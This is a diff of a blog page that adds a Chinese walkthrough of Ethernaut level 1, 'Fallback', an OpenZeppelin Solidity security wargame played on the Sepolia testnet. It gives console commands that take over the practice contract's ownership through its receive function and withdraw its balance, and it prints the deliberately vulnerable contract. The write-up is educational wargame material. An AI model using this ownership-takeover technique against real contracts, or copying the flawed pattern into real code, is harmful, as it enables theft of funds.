@@ -169,12 +169,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
@@ -199,6 +199,155 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ckj3134.github.io/2025/04/08/Ethernaut%E7%AC%AC1%E5%85%B3-fallback%E8%A7%A3%E9%A2%98%E6%8C%87%E5%8D%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avater.jpg">
+      <meta itemprop="name" content="ccc ckj!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的安全 or web3?">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 从零开始的安全 or web3?">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/08/Ethernaut%E7%AC%AC1%E5%85%B3-fallback%E8%A7%A3%E9%A2%98%E6%8C%87%E5%8D%97/" class="post-title-link" itemprop="url">Ethernaut第1关-fallback解题指南</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-04-09 00:30:46 / Modified: 00:31:55" itemprop="dateCreated datePublished" datetime="2025-04-09T00:30:46+08:00">2025-04-09</time>
+    </span>
+
+  
+    <span id="/2025/04/08/Ethernaut%E7%AC%AC1%E5%85%B3-fallback%E8%A7%A3%E9%A2%98%E6%8C%87%E5%8D%97/" class="post-meta-item leancloud_visitors" data-flag-title="Ethernaut第1关-fallback解题指南" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Ethernaut-第-1-关-Fallback-解题指南"><a href="#Ethernaut-第-1-关-Fallback-解题指南" class="headerlink" title="Ethernaut 第 1 关 - Fallback 解题指南"></a>Ethernaut 第 1 关 - Fallback 解题指南</h1><p>Ethernaut 是 OpenZeppelin 提供的 Web3&#x2F;Solidity 战游戏，通过“黑客”智能合约帮助学习以太坊安全知识。第 1 关“Fallback”是一个基础关卡，旨在让玩家理解回退函数的潜在漏洞。本指南详细解释如何解决关卡 <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB">https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB</a>，并提供完整步骤。</p>
+<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
+<li>安装并配置 <a target="_blank" rel="noopener" href="https://metamask.io/">Metamask</a>，连接到 Sepolia 测试网。</li>
+<li>从 <a target="_blank" rel="noopener" href="https://sepoliafaucet.com/">Sepolia Faucet</a> 获取测试网 ETH。</li>
+<li>访问 <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut 官网</a> 并生成新实例。</li>
+</ul>
+<h2 id="关卡目标"><a href="#关卡目标" class="headerlink" title="关卡目标"></a>关卡目标</h2><ul>
+<li>成为合约的 <code>owner</code>。</li>
+<li>将合约余额减少到 0（初始余额为 0.001 ETH）。</li>
+</ul>
+<h2 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h2><h3 id="1-准备环境"><a href="#1-准备环境" class="headerlink" title="1. 准备环境"></a>1. 准备环境</h3><ul>
+<li>确保 Metamask 已连接到 Sepolia 测试网并有足够的 ETH。</li>
+<li>在 Ethernaut 第 1 关页面点击“生成新实例”，获取合约地址。</li>
+<li>打开浏览器开发者工具（F12），切换到 Console 标签。</li>
+</ul>
+<h3 id="2-发送初始贡献"><a href="#2-发送初始贡献" class="headerlink" title="2. 发送初始贡献"></a>2. 发送初始贡献</h3><ul>
+<li>调用 <code>contribute</code> 函数，发送少量 ETH（例如 0.0001 ETH）：<br>···javascript<br>await contract.contribute({ value: ethers.parseEther(“0.0001”) })<br>···</li>
+<li>这将记录你的贡献，满足回退函数的要求。</li>
+</ul>
+<h3 id="3-触发回退函数接管所有权"><a href="#3-触发回退函数接管所有权" class="headerlink" title="3. 触发回退函数接管所有权"></a>3. 触发回退函数接管所有权</h3><ul>
+<li>直接向合约发送 ETH（例如 0.001 ETH），触发 <code>receive</code> 函数：<br>···javascript<br>await web3.eth.sendTransaction({<br>from: player,<br>to: contract.address,<br>value: ethers.parseEther(“0.001”)<br>})<br>···</li>
+<li>发送成功后，你将成为新的 <code>owner</code>。</li>
+</ul>
+<h3 id="4-提取资金"><a href="#4-提取资金" class="headerlink" title="4. 提取资金"></a>4. 提取资金</h3><ul>
+<li>调用 <code>withdraw</code> 函数提取所有余额：<br>···javascript<br>await contract.withdraw()<br>···</li>
+<li>合约余额将被转回你的钱包。</li>
+</ul>
+<h3 id="5-验证完成"><a href="#5-验证完成" class="headerlink" title="5. 验证完成"></a>5. 验证完成</h3><ul>
+<li>检查合约余额（应为 0）：<br>···javascript<br>await web3.eth.getBalance(contract.address)<br>···</li>
+<li>检查 <code>owner</code>（应为你的地址）：<br>···javascript<br>await contract.owner()<br>···</li>
+<li>在 Ethernaut 页面点击“Submit Instance”验证。</li>
+</ul>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
+<li><strong>ETH 单位</strong>：<code>ethers.parseEther(&quot;0.001&quot;)</code> 将 0.001 ETH 转换为 Wei。</li>
+<li><strong>交易确认</strong>：每次调用需等待交易确认。</li>
+<li><strong>成本</strong>：需支付少量 ETH，但提取的资金会覆盖成本。</li>
+</ul>
+<h2 id="合约代码参考"><a href="#合约代码参考" class="headerlink" title="合约代码参考"></a>合约代码参考</h2><p>以下是关卡的简化合约代码：<br>···solidity<br>contract Fallback {<br>    mapping(address &#x3D;&gt; uint) public contributions;<br>    address public owner;</p>
+<pre><code>constructor() &#123;
+    owner = msg.sender;
+    contributions[msg.sender] = 1000 * (1 ether);
+&#125;
+
+modifier onlyOwner &#123;
+    require(msg.sender == owner, &quot;caller is not the owner&quot;);
+    _;
+&#125;
+
+function contribute() public payable &#123;
+    require(msg.value &lt; 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if (contributions[msg.sender] &gt; contributions[owner]) &#123;
+        owner = msg.sender;
+    &#125;
+&#125;
+
+receive() external payable &#123;
+    require(msg.value &gt; 0);
+    require(contributions[msg.sender] &gt; 0);
+    owner = msg.sender;
+&#125;
+
+function withdraw() public onlyOwner &#123;
+    payable(owner).transfer(address(this).balance);
+&#125;
+</code></pre>
+<p>}<br>···</p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>通过利用回退函数的漏洞，你成功接管合约并提取所有资金，完成第 1 关。这一关展示了回退函数设计不当的安全风险。</p>
+<h2 id="资源与参考"><a href="#资源与参考" class="headerlink" title="资源与参考"></a>资源与参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut 官网</a></li>
+<li><a target="_blank" rel="noopener" href="https://metamask.io/">Metamask 官网</a></li>
+<li><a target="_blank" rel="noopener" href="https://sepoliafaucet.com/">Sepolia Faucet</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -236,9 +385,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2025-04-08 00:55:16 / Modified: 01:22:29" itemprop="dateCreated datePublished" datetime="2025-04-08T00:55:16+08:00">2025-04-08</time>
+      <time title="Created: 2025-04-08 00:55:16" itemprop="dateCreated datePublished" datetime="2025-04-08T00:55:16+08:00">2025-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-04-09 00:31:55" itemprop="dateModified" datetime="2025-04-09T00:31:55+08:00">2025-04-09</time>
     </span>
 
   
@@ -418,7 +573,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-04-08 01:22:29" itemprop="dateModified" datetime="2025-04-08T01:22:29+08:00">2025-04-08</time>
+      <time title="Modified: 2025-04-09 00:31:55" itemprop="dateModified" datetime="2025-04-09T00:31:55+08:00">2025-04-09</time>
     </span>
 
   
@@ -559,7 +714,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-04-08 01:22:29" itemprop="dateModified" datetime="2025-04-08T01:22:29+08:00">2025-04-08</time>
+      <time title="Modified: 2025-04-09 00:31:55" itemprop="dateModified" datetime="2025-04-09T00:31:55+08:00">2025-04-09</time>
     </span>
 
   
@@ -687,7 +842,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-04-08 01:22:29" itemprop="dateModified" datetime="2025-04-08T01:22:29+08:00">2025-04-08</time>
+      <time title="Modified: 2025-04-09 00:31:55" itemprop="dateModified" datetime="2025-04-09T00:31:55+08:00">2025-04-09</time>
     </span>
 
   
@@ -788,7 +943,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-04-08 01:22:29" itemprop="dateModified" datetime="2025-04-08T01:22:29+08:00">2025-04-08</time>
+      <time title="Modified: 2025-04-09 00:31:55" itemprop="dateModified" datetime="2025-04-09T00:31:55+08:00">2025-04-09</time>
     </span>
 
   
